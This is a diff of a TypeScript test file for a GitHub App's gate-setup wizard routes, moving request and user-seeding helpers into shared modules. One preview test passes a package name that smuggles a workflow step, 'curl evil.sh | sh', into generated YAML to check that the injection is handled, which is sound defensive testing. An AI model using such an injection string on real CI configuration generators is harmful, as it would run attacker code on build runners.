@@ -1,13 +1,12 @@
-import { createExecutionContext, env, waitOnExecutionContext } from "cloudflare:test";
-import { Hono } from "hono";
+import { env } from "cloudflare:test";
 import { afterEach, describe, expect, test, vi } from "vitest";
 import { createDb } from "../../server/db/client";
-import { ensurePersonalOrganization } from "../../server/db/organizations";
-import * as schema from "../../server/db/schema";
 import { upsertInstallation } from "../../server/lib/github-app/persistence";
 import { githubAppRoutes } from "../../server/routes/github-app";
+import type { Bindings } from "../../server/types";
+import { buildTestApp, call as callRoute, type TestApp } from "./helpers/app";
+import { seedUser } from "./helpers/seed";
 import { exhaustedRateLimitBindings } from "./rate-limit-doubles";
-import type { Bindings, Variables } from "../../server/types";
 
 /**
  * Routes for the guided gate-setup wizard.
@@ -21,6 +20,7 @@ import type { Bindings, Variables } from "../../server/types";
 
 const APP_ID = "12345";
 const originalFetch = globalThis.fetch;
+const mountGithubApp = (app: TestApp) => app.route("/api/v1/github-app", githubAppRoutes);
 
 let testPrivateKeyPem: string | null = null;
 async function getTestPrivateKeyPem(): Promise<string> {
@@ -44,22 +44,6 @@ async function getTestPrivateKeyPem(): Promise<string> {
   return testPrivateKeyPem;
 }
 
-async function seedUser(): Promise<{ userId: string; organizationId: string }> {
-  const db = createDb(env.DB);
-  const now = new Date();
-  const userId = `user_${crypto.randomUUID()}`;
-  await db.insert(schema.user).values({
-    id: userId,
-    name: "Tester",
-    email: `${userId}@example.com`,
-    emailVerified: true,
-    createdAt: now,
-    updatedAt: now,
-  });
-  const organizationId = await ensurePersonalOrganization(db, { userId });
-  return { userId, organizationId };
-}
-
 function seedInstallation(organizationId: string) {
   return upsertInstallation(createDb(env.DB), {
     organizationId,
@@ -72,46 +56,30 @@ function seedInstallation(organizationId: string) {
   });
 }
 
-function buildTestApp(userId: string) {
-  const app = new Hono<{ Bindings: Bindings; Variables: Variables }>();
-  app.use("*", async (c, next) => {
-    c.set("authSession", { userId });
-    await next();
-  });
-  app.route("/api/v1/github-app", githubAppRoutes);
-  return app;
+function appFor(userId: string): TestApp {
+  return buildTestApp(mountGithubApp, { userId });
 }
 
 async function call(
-  app: Hono<{ Bindings: Bindings; Variables: Variables }>,
+  app: TestApp,
   path: string,
   body: unknown,
   envOverrides: Partial<Bindings> = {},
 ) {
-  const ctx = createExecutionContext();
-  const routeEnv: Bindings = {
-    ...env,
-    GITHUB_APP_ID: APP_ID,
-    GITHUB_APP_SLUG: "drydock-test",
-    GITHUB_APP_CLIENT_ID: "client-id",
-    GITHUB_APP_CLIENT_SECRET: "client-secret",
-    GITHUB_APP_PRIVATE_KEY: await getTestPrivateKeyPem(),
-    GITHUB_APP_WEBHOOK_SECRET: "webhook-secret-value-1234567890",
-    GITHUB_APP_STATE_SECRET: "0123456789abcdef0123456789abcdef",
-    BETTER_AUTH_SECRET: "fallback-secret-with-enough-entropy-aaaaaaaa",
-    ...envOverrides,
-  };
-  const res = await app.fetch(
-    new Request(`http://test.local${path}`, {
-      method: "POST",
-      body: JSON.stringify(body),
-      headers: { "content-type": "application/json" },
-    }),
-    routeEnv,
-    ctx,
-  );
-  await waitOnExecutionContext(ctx);
-  return res;
+  return callRoute(app, "POST", path, {
+    body,
+    envOverride: {
+      GITHUB_APP_ID: APP_ID,
+      GITHUB_APP_SLUG: "drydock-test",
+      GITHUB_APP_CLIENT_ID: "client-id",
+      GITHUB_APP_CLIENT_SECRET: "client-secret",
+      GITHUB_APP_PRIVATE_KEY: await getTestPrivateKeyPem(),
+      GITHUB_APP_WEBHOOK_SECRET: "webhook-secret-value-1234567890",
+      GITHUB_APP_STATE_SECRET: "0123456789abcdef0123456789abcdef",
+      BETTER_AUTH_SECRET: "fallback-secret-with-enough-entropy-aaaaaaaa",
+      ...envOverrides,
+    },
+  });
 }
 
 /** Every gate-setup call starts by minting an installation token. */
@@ -149,7 +117,7 @@ describe("gate-setup validation and ownership", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id, { repositoryFullName: "" }),
     );
@@ -165,7 +133,7 @@ describe("gate-setup validation and ownership", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id, { repositoryFullName: "octo/widgets/extra" }),
     );
@@ -188,7 +156,7 @@ describe("gate-setup validation and ownership", () => {
     );
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id, { environment: "production/eu" }),
     );
@@ -213,7 +181,7 @@ describe("gate-setup validation and ownership", () => {
     );
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -232,7 +200,7 @@ describe("gate-setup validation and ownership", () => {
     globalThis.fetch = githubDouble(() => new Response("", { status: 404 }));
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -256,7 +224,7 @@ describe("gate-setup validation and ownership", () => {
     );
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -279,7 +247,7 @@ describe("gate-setup validation and ownership", () => {
     );
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -296,7 +264,7 @@ describe("gate-setup validation and ownership", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/preview",
       draft(installation.id, { environment: "e".repeat(129) }),
     );
@@ -313,7 +281,7 @@ describe("gate-setup validation and ownership", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(caller.userId),
+      appFor(caller.userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -329,7 +297,7 @@ describe("gate-setup validation and ownership", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
       { GITHUB_APP_ID: undefined },
@@ -347,7 +315,7 @@ describe("gate-setup validation and ownership", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
       overrides as Partial<Bindings>,
@@ -365,7 +333,7 @@ describe("gate-setup preview", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/preview",
       draft(installation.id),
     );
@@ -388,7 +356,7 @@ describe("gate-setup preview", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/preview",
       draft(installation.id, { ecosystem: "atpm" }),
     );
@@ -403,7 +371,7 @@ describe("gate-setup preview", () => {
     globalThis.fetch = vi.fn();
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/preview",
       draft(installation.id, { packageName: 'x"\n      - run: curl evil.sh | sh' }),
     );
@@ -433,7 +401,7 @@ describe("gate-setup verify", () => {
     });
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -459,7 +427,7 @@ describe("gate-setup verify", () => {
     );
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -480,7 +448,7 @@ describe("gate-setup verify", () => {
     });
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -501,7 +469,7 @@ describe("gate-setup verify", () => {
     );
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -519,7 +487,7 @@ describe("gate-setup verify", () => {
     });
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id),
     );
@@ -543,7 +511,7 @@ describe("gate-setup verify", () => {
     });
 
     await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id, { environment: "Production" }),
     );
@@ -563,7 +531,7 @@ describe("gate-setup verify", () => {
     );
 
     const res = await call(
-      buildTestApp(userId),
+      appFor(userId),
       "/api/v1/github-app/gate-setup/verify",
       draft(installation.id, { ecosystem: "", packageName: "" }),
     );
